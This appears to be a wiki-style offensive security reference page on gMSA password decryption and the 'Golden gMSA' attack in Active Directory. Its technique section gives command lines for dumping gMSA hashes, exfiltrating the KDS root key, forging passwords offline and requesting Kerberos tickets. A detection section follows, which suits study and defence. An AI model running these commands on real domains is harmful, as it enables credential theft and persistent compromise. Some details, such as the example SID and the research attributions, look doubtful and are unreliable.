---
title: gMSA Password Decryption
slug: gmsa-decryption
---

> **TL;DR:** A principal that can read `msDS-ManagedPassword` — or that owns the KDS root key — can derive any Group Managed Service Account's NT hash and impersonate the service.

## What it is
Group Managed Service Accounts (gMSA) store an auto-rotating 256-byte blob in `msDS-ManagedPassword`, which the DC computes deterministically from the domain's KDS root key plus the account's SID and rotation epoch. Semperis/Specterops research (2019, refined by Sean Metcalf and the GoldengMSA tool in 2022) showed two practical primitives: (1) read the blob with delegated rights and derive the NT hash with `gMSADumper`, and (2) steal the KDS root key from `CN=Master Root Keys` to forge any gMSA password offline — the "Golden gMSA". Outcome: persistent service-account compromise that survives the 30-day rotation.

## Preconditions / where it applies
- For `gMSADumper`: membership in `PrincipalsAllowedToRetrieveManagedPassword` on the target gMSA
- For Golden gMSA: read access to `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration` (Domain Admins by default, but commonly delegated to backup or T1 admins)
- Windows Server 2012+ domain functional level
- Network access to LDAP (389/636) on a DC

## Technique
Read the live blob, then forge any gMSA offline once the KDS key is exfiltrated.

```bash
# 1. Direct read (requires PrincipalsAllowedToRetrieveManagedPassword)
python3 gMSADumper.py -u lowpriv -p 'Password1!' \
    -d corp.local -l dc01.corp.local
# -> svc_sql$:::aad3b435b51404eeaad3b435b51404ee:<NT hash>

# 2. Exfiltrate the KDS root key
SharpKatz.exe --Command kdsKey --Server dc01.corp.local

# 3. Forge any gMSA password offline (Golden gMSA)
GoldengMSA.exe compute \
    --sid S-1-5-21-...-512 \
    --kdskey <hex-blob> \
    --pwdid <managedPasswordID>
```

The forged blob feeds directly into `Rubeus asktgt /user:svc_sql$ /rc4:<hash>` for Kerberos ticket requests.

## Detection and defence
- Event ID 4662 with property `{4828cc14-1437-45bc-9b07-ad6f015e5f28}` (msDS-ManagedPassword) read by non-service principals
- Event ID 4662 on KDS root key container (`{e95819b6-...}`) — should be empty outside DC self-reads
- Rotate KDS root keys annually and audit `PrincipalsAllowedToRetrieveManagedPassword` quarterly
- Defender for Identity "Suspicious Kerberos delegation" and Microsoft's `Get-ADServiceAccount -Properties *` baseline
- Tier-0 the KDS Admins; treat the root key like a CA private key

## References
- [Semperis Golden gMSA whitepaper](https://www.semperis.com/blog/golden-gmsa-attack/) — root key abuse detail
- [gMSADumper repository](https://github.com/micahvandeusen/gMSADumper) — read-and-derive tool

See also: [[dcsync]], [[ad-persistence]], [[kerberoasting]].
